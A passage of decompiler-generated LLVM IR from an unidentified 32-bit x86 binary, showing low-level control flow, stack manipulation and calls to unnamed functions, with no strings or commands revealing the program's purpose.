  store i1 %v12_804956d, i1* %zf.global-to-local, align 1
  br i1 %v12_804956d, label %dec_label_pc_80496da, label %dec_label_pc_8049577

dec_label_pc_8049577:                             ; preds = %dec_label_pc_804956d
  %v3_8049577 = load i32, i32* %v2_8049562, align 4
  store i32 %v3_8049577, i32* %ecx.global-to-local, align 4
  %v1_804957b = add i32 %v3_8049577, 660
  %v2_804957b = inttoptr i32 %v1_804957b to i32*
  %v3_804957b = load i32, i32* %v2_804957b, align 4
  %v1_8049581 = load i32, i32* @ebx, align 4
  %v2_8049581 = sub i32 %v3_804957b, %v1_8049581
  %v12_8049581 = icmp eq i32 %v2_8049581, 0
  store i32 %v2_8049581, i32* %eax.global-to-local, align 4
  %v2_8049583 = add i32 %v3_8049577, 12
  %v3_8049583 = inttoptr i32 %v2_8049583 to i32*
  store i32 %v2_8049581, i32* %v3_8049583, align 4
  store i1 %v12_8049581, i1* %zf.global-to-local, align 1
  br i1 %v12_8049581, label %dec_label_pc_8049af8, label %dec_label_pc_804958e

dec_label_pc_804958e:                             ; preds = %dec_label_pc_8049577, %dec_label_pc_8049562, %dec_label_pc_80496da, %dec_label_pc_8049764
  %v0_804958e = load i32, i32* @ebx, align 4
  %v1_804958e = icmp eq i32 %v0_804958e, 0
  store i1 %v1_804958e, i1* %zf.global-to-local, align 1
  br i1 %v1_804958e, label %dec_label_pc_80495e0, label %dec_label_pc_8049592

dec_label_pc_8049592:                             ; preds = %dec_label_pc_804958e
  %v0_8049592 = load i32, i32* @esp, align 4
  %v1_8049592 = add i32 %v0_8049592, 92
  %v2_8049592 = inttoptr i32 %v1_8049592 to i32*
  %v3_8049592 = load i32, i32* %v2_8049592, align 4
  store i32 %v3_8049592, i32* %edx.global-to-local, align 4
  %v1_8049596 = add i32 %v3_8049592, 660
  %v2_8049596 = inttoptr i32 %v1_8049596 to i32*
  %v3_8049596 = load i32, i32* %v2_8049596, align 4
  %v2_804959c = sub i32 %v3_8049596, %v0_804958e
  %v12_804959c = icmp eq i32 %v2_804959c, 0
  store i1 %v12_804959c, i1* %zf.global-to-local, align 1
  store i32 %v2_804959c, i32* %eax.global-to-local, align 4
  store i32 %v2_804959c, i32* %v2_8049596, align 4
  %v0_80495a4 = load i32, i32* %edx.global-to-local, align 4
  %v1_80495a4 = load i32, i32* @esp, align 4
  %v2_80495a4 = add i32 %v1_80495a4, -4
  %v3_80495a4 = inttoptr i32 %v2_80495a4 to i32*
  store i32 %v0_80495a4, i32* %v3_80495a4, align 4
  %v0_80495a5 = load i32, i32* %eax.global-to-local, align 4
  %v2_80495a5 = add i32 %v1_80495a4, -8
  %v3_80495a5 = inttoptr i32 %v2_80495a5 to i32*
  store i32 %v0_80495a5, i32* %v3_80495a5, align 4
  %v0_80495a6 = load i32, i32* @esi, align 4
  %v1_80495a6 = load i32, i32* @ebx, align 4
  %v2_80495a6 = add i32 %v1_80495a6, %v0_80495a6
  store i32 %v2_80495a6, i32* %eax.global-to-local, align 4
  %v2_80495a9 = add i32 %v1_80495a4, -12
  %v3_80495a9 = inttoptr i32 %v2_80495a9 to i32*
  store i32 %v2_80495a6, i32* %v3_80495a9, align 4
  %v0_80495aa = load i32, i32* @esi, align 4
  %v2_80495aa = add i32 %v1_80495a4, -16
  %v3_80495aa = inttoptr i32 %v2_80495aa to i32*
  store i32 %v0_80495aa, i32* %v3_80495aa, align 4
  %v4_80495ab = call i32 @function_80500b3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_80495ab, i32* %eax.global-to-local, align 4
  %v0_80495b0 = load i32, i32* @esp, align 4
  %v1_80495b0 = add i32 %v0_80495b0, 108
  %v2_80495b0 = inttoptr i32 %v1_80495b0 to i32*
  %v3_80495b0 = load i32, i32* %v2_80495b0, align 4
  store i32 %v3_80495b0, i32* %ecx.global-to-local, align 4
  %v1_80495b4 = add i32 %v0_80495b0, 92
  %v2_80495b4 = inttoptr i32 %v1_80495b4 to i32*
  %v3_80495b4 = load i32, i32* %v2_80495b4, align 4
  store i32 %v3_80495b4, i32* %edx.global-to-local, align 4
  %v1_80495b8 = add i32 %v3_80495b0, 660
  %v2_80495b8 = inttoptr i32 %v1_80495b8 to i32*
  %v3_80495b8 = load i32, i32* %v2_80495b8, align 4
  store i32 %v3_80495b8, i32* %eax.global-to-local, align 4
  %v1_80495c1 = icmp eq i32 %v3_80495b8, 0
  store i1 %v1_80495c1, i1* %zf.global-to-local, align 1
  %v2_80495c3 = add i32 %v3_80495b4, 2116
  %v3_80495c3 = add i32 %v2_80495c3, %v3_80495b8
  %v4_80495c3 = inttoptr i32 %v3_80495c3 to i8*
  store i8 0, i8* %v4_80495c3, align 1
  %v0_80495cb = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_80495cb, label %dec_label_pc_80495e0, label %dec_label_pc_80495cd

dec_label_pc_80495cd:                             ; preds = %dec_label_pc_8049592
  %v0_80495cd = load i32, i32* @esp, align 4
  %v1_80495cd = add i32 %v0_80495cd, 92
  %v2_80495cd = inttoptr i32 %v1_80495cd to i32*
  %v3_80495cd = load i32, i32* %v2_80495cd, align 4
  store i32 %v3_80495cd, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80495d1

dec_label_pc_80495d1:                             ; preds = %dec_label_pc_8049521, %dec_label_pc_80495cd
  %v0_8049542 = phi i32 [ %v0_80495d1.pre, %dec_label_pc_8049521 ], [ %v3_80495cd, %dec_label_pc_80495cd ]
  %v1_80495d1 = add i32 %v0_8049542, 12
  %v2_80495d1 = inttoptr i32 %v1_80495d1 to i32*
  %v3_80495d1 = load i32, i32* %v2_80495d1, align 4
  store i32 %v3_80495d1, i32* %eax.global-to-local, align 4
  %v1_80495d4 = icmp eq i32 %v3_80495d1, 0
  store i1 %v1_80495d4, i1* %zf.global-to-local, align 1
  %tmp145 = icmp slt i32 %v3_80495d1, 1
  %tmp146 = icmp eq i1 %tmp145, false
  br i1 %tmp146, label %dec_label_pc_8049542, label %dec_label_pc_80495dc

dec_label_pc_80495dc:                             ; preds = %dec_label_pc_80495d1
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_8049562

dec_label_pc_80495e0:                             ; preds = %dec_label_pc_8049592, %dec_label_pc_804958e
  %v0_80495e0 = load i32, i32* @esp, align 4
  %v1_80495e0 = add i32 %v0_80495e0, 92
  %v2_80495e0 = inttoptr i32 %v1_80495e0 to i32*
  %v3_80495e0 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495e0, i32* %eax.global-to-local, align 4
  %v1_80495e4 = add i32 %v3_80495e0, -1448
  %v2_80495e4 = inttoptr i32 %v1_80495e4 to i8*
  %v3_80495e4 = load i8, i8* %v2_80495e4, align 1
  %v12_80495e4 = icmp eq i8 %v3_80495e4, 7
  store i1 %v12_80495e4, i1* %zf.global-to-local, align 1
  %v1_80495eb = icmp eq i1 %v12_80495e4, false
  br i1 %v1_80495eb, label %dec_label_pc_8048d91, label %dec_label_pc_80495f1

dec_label_pc_80495f1:                             ; preds = %dec_label_pc_80495e0
  %v3_80495f1 = load i32, i32* %v2_80495e0, align 4
  store i32 %v3_80495f1, i32* %edx.global-to-local, align 4
  %v1_80495f5 = add i32 %v3_80495f1, 660
  %v2_80495f5 = inttoptr i32 %v1_80495f5 to i32*
  %v3_80495f5 = load i32, i32* %v2_80495f5, align 4
  %v9_80495f5 = icmp eq i32 %v3_80495f5, 1024
  store i1 %v9_80495f5, i1* %zf.global-to-local, align 1
  %v1_80495ff = icmp eq i1 %v9_80495f5, false
  br i1 %v1_80495ff, label %dec_label_pc_80494dc, label %dec_label_pc_8049605

dec_label_pc_8049605:                             ; preds = %dec_label_pc_80495f1, %dec_label_pc_80494af
  %v1_8049605 = phi i32 [ %v0_80494b4, %dec_label_pc_80494af ], [ %v0_80495e0, %dec_label_pc_80495f1 ]
  %v0_8049605 = phi i32 [ %v1_80494af, %dec_label_pc_80494af ], [ %v3_80495e0, %dec_label_pc_80495f1 ]
  %v2_8049605 = add i32 %v1_8049605, -4
  %v3_8049605 = inttoptr i32 %v2_8049605 to i32*
  store i32 %v0_8049605, i32* %v3_8049605, align 4
  %v1_8049606 = add i32 %v1_8049605, -8
  %v2_8049606 = inttoptr i32 %v1_8049606 to i32*
  store i32 960, i32* %v2_8049606, align 4
  %v1_804960b = add i32 %v1_8049605, 76
  %v2_804960b = inttoptr i32 %v1_804960b to i32*
  %v3_804960b = load i32, i32* %v2_804960b, align 4
  %v1_804960f = add i32 %v3_804960b, 2180
  %v9_804960f = icmp eq i32 %v1_804960f, 0
  store i1 %v9_804960f, i1* %zf.global-to-local, align 1
  store i32 %v1_804960f, i32* %eax.global-to-local, align 4
  %v2_8049614 = add i32 %v1_8049605, -12
  %v3_8049614 = inttoptr i32 %v2_8049614 to i32*
  store i32 %v1_804960f, i32* %v3_8049614, align 4
  %v0_8049615 = load i32, i32* @esi, align 4
  %v2_8049615 = add i32 %v1_8049605, -16
  %v3_8049615 = inttoptr i32 %v2_8049615 to i32*
  store i32 %v0_8049615, i32* %v3_8049615, align 4
  %v4_8049616 = call i32 @function_80500b3(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049616, i32* %eax.global-to-local, align 4
  %v0_804961b = load i32, i32* @esp, align 4
  %v1_804961b = add i32 %v0_804961b, 108
  %v2_804961b = inttoptr i32 %v1_804961b to i32*
  %v3_804961b = load i32, i32* %v2_804961b, align 4
  store i32 %v3_804961b, i32* %ecx.global-to-local, align 4
  %v1_804961f = add i32 %v3_804961b, 660
  %v2_804961f = inttoptr i32 %v1_804961f to i32*
  %v3_804961f = load i32, i32* %v2_804961f, align 4
  %v1_8049628 = add i32 %v3_804961f, -64
  %v6_8049628 = icmp eq i32 %v1_8049628, 0
  store i1 %v6_8049628, i1* %zf.global-to-local, align 1
  store i32 %v1_8049628, i32* %eax.global-to-local, align 4
  store i32 %v1_8049628, i32* %v2_804961f, align 4
  %v0_80494dc.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80494dc

dec_label_pc_8049636:                             ; preds = %dec_label_pc_8049550
  %v0_8049636 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049636 = load i32, i32* @esp, align 4
  %v2_8049636 = add i32 %v1_8049636, -4
  %v3_8049636 = inttoptr i32 %v2_8049636 to i32*
  store i32 %v0_8049636, i32* %v3_8049636, align 4
  %v0_8049637 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049637 = add i32 %v1_8049636, -8
  %v3_8049637 = inttoptr i32 %v2_8049637 to i32*
  store i32 %v0_8049637, i32* %v3_8049637, align 4
  %v1_8049638 = add i32 %v1_8049636, -12
  %v2_8049638 = inttoptr i32 %v1_8049638 to i32*
  store i32 0, i32* %v2_8049638, align 4
  %v1_804963a = add i32 %v1_8049636, -16
  %v2_804963a = inttoptr i32 %v1_804963a to i32*
  store i32 36, i32* %v2_804963a, align 4
  %v3_804963c = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_804963c, i32* %eax.global-to-local, align 4
  %v0_8049641 = load i32, i32* @esp, align 4
  %v1_8049641 = add i32 %v0_8049641, -4
  %v2_8049641 = inttoptr i32 %v1_8049641 to i32*
  store i32 11, i32* %v2_8049641, align 4
  %v2_8049643 = add i32 %v0_8049641, -8
  %v3_8049643 = inttoptr i32 %v2_8049643 to i32*
  store i32 %v3_804963c, i32* %v3_8049643, align 4
  %v1_8049644 = add i32 %v0_8049641, 108
  %v2_8049644 = inttoptr i32 %v1_8049644 to i32*
  %v3_8049644 = load i32, i32* %v2_8049644, align 4
  store i32 %v3_8049644, i32* %ecx.global-to-local, align 4
  %v1_8049648 = add i32 %v3_8049644, 660
  %v2_8049648 = inttoptr i32 %v1_8049648 to i32*
  %v3_8049648 = load i32, i32* %v2_8049648, align 4
  store i32 %v3_8049648, i32* %eax.global-to-local, align 4
  %v2_804964e = add i32 %v0_8049641, -12
  %v3_804964e = inttoptr i32 %v2_804964e to i32*
  store i32 %v3_8049648, i32* %v3_804964e, align 4
  %v0_804964f = load i32, i32* @esi, align 4
  %v2_804964f = add i32 %v0_8049641, -16
  %v3_804964f = inttoptr i32 %v2_804964f to i32*
  store i32 %v0_804964f, i32* %v3_804964f, align 4
  %v0_8049650 = call i32 @function_804f660()
  %v0_8049655 = load i32, i32* @esp, align 4
  %v1_8049658 = add i32 %v0_8049650, 1
  %v8_8049658 = icmp eq i32 %v1_8049658, 0
  store i1 %v8_8049658, i1* %zf.global-to-local, align 1
  store i32 %v1_8049658, i32* %eax.global-to-local, align 4
  br i1 %v8_8049658, label %dec_label_pc_8049562, label %dec_label_pc_804965f

dec_label_pc_804965f:                             ; preds = %dec_label_pc_8049636
  %v2_804965f = add i32 %v0_8049655, 28
  %v3_804965f = inttoptr i32 %v2_804965f to i32*
  store i32 %v1_8049658, i32* %v3_804965f, align 4
  %v0_8049660 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049660 = add i32 %v0_8049655, 24
  %v3_8049660 = inttoptr i32 %v2_8049660 to i32*
  store i32 %v0_8049660, i32* %v3_8049660, align 4
  %v1_8049661 = add i32 %v0_8049655, 20
  %v2_8049661 = inttoptr i32 %v1_8049661 to i32*
  store i32 0, i32* %v2_8049661, align 4
  %v1_8049663 = add i32 %v0_8049655, 16
  %v2_8049663 = inttoptr i32 %v1_8049663 to i32*
  store i32 36, i32* %v2_8049663, align 4
  %v3_8049665 = call i32 @function_804ebb0(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049665, i32* %eax.global-to-local, align 4
  %v0_804966a = load i32, i32* @esp, align 4
  %v1_804966a = add i32 %v0_804966a, -4
  %v2_804966a = inttoptr i32 %v1_804966a to i32*
  store i32 11, i32* %v2_804966a, align 4
  %v2_804966c = add i32 %v0_804966a, -8
  %v3_804966c = inttoptr i32 %v2_804966c to i32*
  store i32 %v3_8049665, i32* %v3_804966c, align 4
  %v1_804966d = add i32 %v0_804966a, 108
  %v2_804966d = inttoptr i32 %v1_804966d to i32*
  %v3_804966d = load i32, i32* %v2_804966d, align 4
  store i32 %v3_804966d, i32* %eax.global-to-local, align 4
  %v1_8049671 = add i32 %v3_804966d, 660
  %v2_8049671 = inttoptr i32 %v1_8049671 to i32*
  %v3_8049671 = load i32, i32* %v2_8049671, align 4
  store i32 %v3_8049671, i32* %eax.global-to-local, align 4
  %v2_8049677 = add i32 %v0_804966a, -12
  %v3_8049677 = inttoptr i32 %v2_8049677 to i32*
  store i32 %v3_8049671, i32* %v3_8049677, align 4
  %v0_8049678 = load i32, i32* @esi, align 4
  %v2_8049678 = add i32 %v0_804966a, -16
  %v3_8049678 = inttoptr i32 %v2_8049678 to i32*
  store i32 %v0_8049678, i32* %v3_8049678, align 4
  %v0_8049679 = call i32 @function_804f660()
  store i32 %v0_8049679, i32* %eax.global-to-local, align 4
  %v0_804967e = load i32, i32* @esp, align 4
  %v1_8049681 = add i32 %v0_804967e, 28
  %v2_8049681 = inttoptr i32 %v1_8049681 to i32*
  store i32 1, i32* %v2_8049681, align 4
  %v1_8049683 = add i32 %v0_804967e, 24
  %v2_8049683 = inttoptr i32 %v1_8049683 to i32*
  store i32 ptrtoint (i32* @global_var_805249a.16 to i32), i32* %v2_8049683, align 4
  %v1_8049688 = add i32 %v0_804967e, 124
  %v2_8049688 = inttoptr i32 %v1_8049688 to i32*
  %v3_8049688 = load i32, i32* %v2_8049688, align 4
  store i32 %v3_8049688, i32* %edx.global-to-local, align 4
  store i32 %v0_8049679, i32* @ebx, align 4
  %v0_804968e = load i32, i32* @esi, align 4
  %v2_804968e = add i32 %v0_804968e, %v0_8049679
  store i32 %v2_804968e, i32* @edi, align 4
  %v1_8049691 = add i32 %v3_8049688, 660
  %v2_8049691 = inttoptr i32 %v1_8049691 to i32*
  %v3_8049691 = load i32, i32* %v2_8049691, align 4
  %v2_8049697 = sub i32 %v3_8049691, %v0_8049679
  %v12_8049697 = icmp eq i32 %v2_8049697, 0
  store i1 %v12_8049697, i1* %zf.global-to-local, align 1
  store i32 %v2_8049697, i32* %eax.global-to-local, align 4
  %v2_8049699 = add i32 %v0_804967e, 20
  %v3_8049699 = inttoptr i32 %v2_8049699 to i32*
  store i32 %v2_8049697, i32* %v3_8049699, align 4
  %v0_804969a = load i32, i32* @edi, align 4
  %v2_804969a = add i32 %v0_804967e, 16
  %v3_804969a = inttoptr i32 %v2_804969a to i32*
  store i32 %v0_804969a, i32* %v3_804969a, align 4
  %v0_804969b = call i32 @function_804f660()
  store i32 %v0_804969b, i32* %eax.global-to-local, align 4
  %v0_80496a0 = load i32, i32* @esp, align 4
  %v1_80496a0 = add i32 %v0_80496a0, 92
  %v2_80496a0 = inttoptr i32 %v1_80496a0 to i32*
  %v3_80496a0 = load i32, i32* %v2_80496a0, align 4
  store i32 %v3_80496a0, i32* %ecx.global-to-local, align 4
  %v0_80496a4 = load i32, i32* @ebx, align 4
  %v2_80496a4 = add i32 %v0_80496a4, %v0_804969b
  store i32 %v2_80496a4, i32* @ebx, align 4
  %v2_80496a6 = add i32 %v0_80496a0, 56
  %v3_80496a6 = inttoptr i32 %v2_80496a6 to i32*
  store i32 %v2_80496a4, i32* %v3_80496a6, align 4
  %v0_80496ad = load i32, i32* @ebx, align 4
  %v1_80496ad = load i32, i32* %ecx.global-to-local, align 4
  %v2_80496ad = add i32 %v0_80496ad, 2115
  %v3_80496ad = add i32 %v2_80496ad, %v1_80496ad
  %v4_80496ad = inttoptr i32 %v3_80496ad to i8*
  store i8 0, i8* %v4_80496ad, align 1
  %v0_80496b5 = load i32, i32* @esp, align 4
  %v1_80496b5 = add i32 %v0_80496b5, 92
  %v2_80496b5 = inttoptr i32 %v1_80496b5 to i32*
  %v3_80496b5 = load i32, i32* %v2_80496b5, align 4
  store i32 %v3_80496b5, i32* %eax.global-to-local, align 4
  %v1_80496b9 = add i32 %v3_80496b5, 16
  %v2_80496b9 = inttoptr i32 %v1_80496b9 to i32*
  %v3_80496b9 = load i32, i32* %v2_80496b9, align 4
  %v4_80496b9 = add i32 %v3_80496b9, -4
  %v9_80496b9 = sub i32 3, %v3_80496b9
  %v10_80496b9 = and i32 %v9_80496b9, %v3_80496b9
  %v11_80496b9 = icmp slt i32 %v10_80496b9, 0
  %v12_80496b9 = icmp eq i32 %v4_80496b9, 0
  store i1 %v12_80496b9, i1* %zf.global-to-local, align 1
  %v13_80496b9 = icmp slt i32 %v4_80496b9, 0
  %v3_80496bd = icmp ne i1 %v13_80496b9, %v11_80496b9
  %v4_80496bd = or i1 %v12_80496b9, %v3_80496bd
  br i1 %v4_80496bd, label %dec_label_pc_8049da3, label %dec_label_pc_80496c3

dec_label_pc_80496c3:                             ; preds = %dec_label_pc_8049da3, %dec_label_pc_804965f, %dec_label_pc_8049db8
  %v0_80496c3 = phi i32 [ %v1_8049dac, %dec_label_pc_8049da3 ], [ %v0_80496b5, %dec_label_pc_804965f ], [ %v0_80496c3.pre, %dec_label_pc_8049db8 ]
  %v1_80496c3 = add i32 %v0_80496c3, 92
  %v2_80496c3 = inttoptr i32 %v1_80496c3 to i32*
  %v3_80496c3 = load i32, i32* %v2_80496c3, align 4
  store i32 %v3_80496c3, i32* %edx.global-to-local, align 4
  %v1_80496c7 = add i32 %v3_80496c3, 12
  %v2_80496c7 = inttoptr i32 %v1_80496c7 to i32*
  store i32 -1, i32* %v2_80496c7, align 4
  %v0_80496ce = load i32, i32* %edx.global-to-local, align 4
  %v1_80496ce = add i32 %v0_80496ce, -1448
  %v2_80496ce = inttoptr i32 %v1_80496ce to i8*
  store i8 10, i8* %v2_80496ce, align 1
  br label %dec_label_pc_8048d91

dec_label_pc_80496da:                             ; preds = %dec_label_pc_804956d
  %v1_80496da = add i32 %v0_8049562, -4
  %v2_80496da = inttoptr i32 %v1_80496da to i32*
  store i32 2, i32* %v2_80496da, align 4
  %v1_80496dc = add i32 %v0_8049562, -8
  %v2_80496dc = inttoptr i32 %v1_80496dc to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v2_80496dc, align 4
  %v0_80496e1 = load i32, i32* %ecx.global-to-local, align 4
  %v1_80496e1 = add i32 %v0_80496e1, 660
  %v2_80496e1 = inttoptr i32 %v1_80496e1 to i32*
  %v3_80496e1 = load i32, i32* %v2_80496e1, align 4
  store i32 %v3_80496e1, i32* %eax.global-to-local, align 4
  %v2_80496e7 = add i32 %v0_8049562, -12
  %v3_80496e7 = inttoptr i32 %v2_80496e7 to i32*
  store i32 %v3_80496e1, i32* %v3_80496e7, align 4
  %v0_80496e8 = load i32, i32* @esi, align 4
  %v2_80496e8 = add i32 %v0_8049562, -16
  %v3_80496e8 = inttoptr i32 %v2_80496e8 to i32*
  store i32 %v0_80496e8, i32* %v3_80496e8, align 4
  %v0_80496e9 = call i32 @function_804f660()
  %v0_80496ee = load i32, i32* @esp, align 4
  %v1_80496f1 = add i32 %v0_80496e9, 1
  %v8_80496f1 = icmp eq i32 %v1_80496f1, 0
  store i1 %v8_80496f1, i1* %zf.global-to-local, align 1
  store i32 %v1_80496f1, i32* %eax.global-to-local, align 4
  br i1 %v8_80496f1, label %dec_label_pc_804958e, label %dec_label_pc_80496f8

dec_label_pc_80496f8:                             ; preds = %dec_label_pc_80496da
  %v1_80496f8 = add i32 %v0_80496ee, 12
  %v2_80496f8 = inttoptr i32 %v1_80496f8 to i32*
  store i32 2, i32* %v2_80496f8, align 4
  %v1_80496fa = add i32 %v0_80496ee, 8
  %v2_80496fa = inttoptr i32 %v1_80496fa to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8052486.10 to i32), i32* %v2_80496fa, align 4
  %v1_80496ff = add i32 %v0_80496ee, 108
  %v2_80496ff = inttoptr i32 %v1_80496ff to i32*
  %v3_80496ff = load i32, i32* %v2_80496ff, align 4
  store i32 %v3_80496ff, i32* %eax.global-to-local, align 4
  %v1_8049703 = add i32 %v3_80496ff, 660
  %v2_8049703 = inttoptr i32 %v1_8049703 to i32*
  %v3_8049703 = load i32, i32* %v2_8049703, align 4
  %v2_8049709 = add i32 %v0_80496ee, 4
  %v3_8049709 = inttoptr i32 %v2_8049709 to i32*
  store i32 %v3_8049703, i32* %v3_8049709, align 4
  %v0_804970a = load i32, i32* @esi, align 4
  %v3_804970a = inttoptr i32 %v0_80496ee to i32*
  store i32 %v0_804970a, i32* %v3_804970a, align 4
  %v0_804970b = call i32 @function_804f660()
  store i32 %v0_804970b, i32* %eax.global-to-local, align 4
  %v0_8049710 = load i32, i32* @esp, align 4
  %v1_8049710 = add i32 %v0_8049710, 92
  %v2_8049710 = inttoptr i32 %v1_8049710 to i32*
  %v3_8049710 = load i32, i32* %v2_8049710, align 4
  store i32 %v3_8049710, i32* %edx.global-to-local, align 4
  store i32 %v0_804970b, i32* @ebx, align 4
  %v2_8049716 = add i32 %v0_804970b, 2114
  %v3_8049716 = add i32 %v2_8049716, %v3_8049710
  %v4_8049716 = inttoptr i32 %v3_8049716 to i8*
  store i8 0, i8* %v4_8049716, align 1
  %v0_804971e = load i32, i32* @esp, align 4
  %v1_804971e = add i32 %v0_804971e, -4
  %v2_804971e = inttoptr i32 %v1_804971e to i32*
  store i32 1, i32* %v2_804971e, align 4
  %v1_8049720 = add i32 %v0_804971e, -8
  %v2_8049720 = inttoptr i32 %v1_8049720 to i32*
  store i32 ptrtoint (i32* @global_var_8052489.14 to i32), i32* %v2_8049720, align 4
  %v2_8049725 = add i32 %v0_804971e, -12
  %v3_8049725 = inttoptr i32 %v2_8049725 to i32*
  store i32 %v0_804970b, i32* %v3_8049725, align 4
  %v0_8049726 = load i32, i32* @esi, align 4
  %v2_8049726 = add i32 %v0_804971e, -16
  %v3_8049726 = inttoptr i32 %v2_8049726 to i32*
  store i32 %v0_8049726, i32* %v3_8049726, align 4
  %v0_8049727 = call i32 @function_804f660()
  %v0_804972c = load i32, i32* @esp, align 4
  %v1_804972c = add i32 %v0_804972c, 32
  %v1_804972f = add i32 %v0_8049727, 1
  %v8_804972f = icmp eq i32 %v1_804972f, 0
  store i1 %v8_804972f, i1* %zf.global-to-local, align 1
  store i32 %v1_804972f, i32* %eax.global-to-local, align 4
  br i1 %v8_804972f, label %dec_label_pc_804974f, label %dec_label_pc_8049732

dec_label_pc_8049732:                             ; preds = %dec_label_pc_80496f8
  %v1_8049732 = add i32 %v0_804972c, 28
  %v2_8049732 = inttoptr i32 %v1_8049732 to i32*
  store i32 1, i32* %v2_8049732, align 4
  %v1_8049734 = add i32 %v0_804972c, 24
  %v2_8049734 = inttoptr i32 %v1_8049734 to i32*
  store i32 ptrtoint (i32* @global_var_8052489.14 to i32), i32* %v2_8049734, align 4
  %v0_8049739 = load i32, i32* @ebx, align 4
  %v2_8049739 = add i32 %v0_804972c, 20
  %v3_8049739 = inttoptr i32 %v2_8049739 to i32*
  store i32 %v0_8049739, i32* %v3_8049739, align 4
  %v0_804973a = load i32, i32* @esi, align 4
  %v2_804973a = add i32 %v0_804972c, 16
  %v3_804973a = inttoptr i32 %v2_804973a to i32*
  store i32 %v0_804973a, i32* %v3_804973a, align 4
  %v0_804973b = call i32 @function_804f660()
  store i32 %v0_804973b, i32* %eax.global-to-local, align 4
  %v0_8049740 = load i32, i32* @esp, align 4
  %v1_8049740 = add i32 %v0_8049740, 92
  %v2_8049740 = inttoptr i32 %v1_8049740 to i32*
  %v3_8049740 = load i32, i32* %v2_8049740, align 4
  store i32 %v3_8049740, i32* @ecx, align 4
  %v6_8049744 = icmp eq i32 %v0_8049740, -16
  store i1 %v6_8049744, i1* %zf.global-to-local, align 1
  %v2_8049747 = add i32 %v0_804973b, 2116
  %v3_8049747 = add i32 %v2_8049747, %v3_8049740
  %v4_8049747 = inttoptr i32 %v3_8049747 to i8*
  store i8 0, i8* %v4_8049747, align 1
  %v1_804974f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804974f

dec_label_pc_804974f:                             ; preds = %dec_label_pc_80496f8, %dec_label_pc_8049732
  %v1_804974f = phi i32 [ %v1_804972c, %dec_label_pc_80496f8 ], [ %v1_804974f.pre, %dec_label_pc_8049732 ]
  %v0_804974f = load i32, i32* @ecx, align 4
  %v2_804974f = add i32 %v1_804974f, -4
  %v3_804974f = inttoptr i32 %v2_804974f to i32*
  store i32 %v0_804974f, i32* %v3_804974f, align 4
  %v0_8049750 = load i32, i32* @ecx, align 4
  %v2_8049750 = add i32 %v1_804974f, -8
  %v3_8049750 = inttoptr i32 %v2_8049750 to i32*
  store i32 %v0_8049750, i32* %v3_8049750, align 4
  %v1_8049751 = add i32 %v1_804974f, -12
  %v2_8049751 = inttoptr i32 %v1_8049751 to i32*
  store i32 16, i32* %v2_8049751, align 4
  %v0_8049753 = load i32, i32* @esi, align 4
  %v2_8049753 = add i32 %v1_804974f, -16
  %v3_8049753 = inttoptr i32 %v2_8049753 to i32*
  store i32 %v0_8049753, i32* %v3_8049753, align 4
  %v3_8049754 = call i32 @function_804f6b0(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8049754, i32* %eax.global-to-local, align 4
  %v0_8049759 = load i32, i32* @esp, align 4
  %v1_804975c = icmp eq i32 %v3_8049754, 0
  store i1 %v1_804975c, i1* %zf.global-to-local, align 1
  %v1_8049e5a = add i32 %v0_8049759, 108
  %v2_8049e5a = inttoptr i32 %v1_8049e5a to i32*
  %v3_8049e5a = load i32, i32* %v2_8049e5a, align 4
  br i1 %v1_804975c, label %dec_label_pc_8049e5a, label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_804974f
  store i32 %v3_8049e5a, i32* %edx.global-to-local, align 4
  %v1_8049768 = add i32 %v3_8049754, 2
  %v9_8049768 = icmp eq i32 %v1_8049768, 0
  store i1 %v9_8049768, i1* %zf.global-to-local, align 1
  store i32 %v1_8049768, i32* %eax.global-to-local, align 4
  %v2_804976b = add i32 %v3_8049e5a, 12
  %v3_804976b = inttoptr i32 %v2_804976b to i32*
  store i32 %v1_8049768, i32* %v3_804976b, align 4
  br label %dec_label_pc_804958e

dec_label_pc_8049773:                             ; preds = %dec_label_pc_804854f
  %v1_8049773 = add i32 %v0_80485a5, -1440
  %v2_8049773 = inttoptr i32 %v1_8049773 to i32*
  %v3_8049773 = load i32, i32* %v2_8049773, align 4
  %v1_804977b = urem i32 %v3_8049773, 32
  store i32 %v1_804977b, i32* %eax.global-to-local, align 4
  %v2_804977e = udiv i32 %v3_8049773, 32
  store i32 %v2_804977e, i32* %edx.global-to-local, align 4
  %v0_8049781 = load i32, i32* @esp, align 4
  %v2_8049781 = mul nuw nsw i32 %v2_804977e, 4
  %v3_8049781 = add nuw nsw i32 %v2_8049781, 20740
  %v4_8049781 = add i32 %v3_8049781, %v0_8049781
  %v5_8049781 = inttoptr i32 %v4_8049781 to i32*
  %v6_8049781 = load i32, i32* %v5_8049781, align 4
  %v9_8049781 = shl i32 1, %v1_804977b
  %v12_8049781 = or i32 %v6_8049781, %v9_8049781
  store i32 %v12_8049781, i32* %v5_8049781, align 4
  %v0_8049789 = load i32, i32* @esi, align 4
  %v1_8049789 = add i32 %v0_8049789, -1440
  %v2_8049789 = inttoptr i32 %v1_8049789 to i32*
  %v3_8049789 = load i32, i32* %v2_8049789, align 4
  store i32 %v3_8049789, i32* %eax.global-to-local, align 4
  %v1_804978f = load i32, i32* @esp, align 4
  %v2_804978f = add i32 %v1_804978f, 72
  %v3_804978f = inttoptr i32 %v2_804978f to i32*
  %v4_804978f = load i32, i32* %v3_804978f, align 4
  %v5_804978f = sub i32 %v3_8049789, %v4_804978f
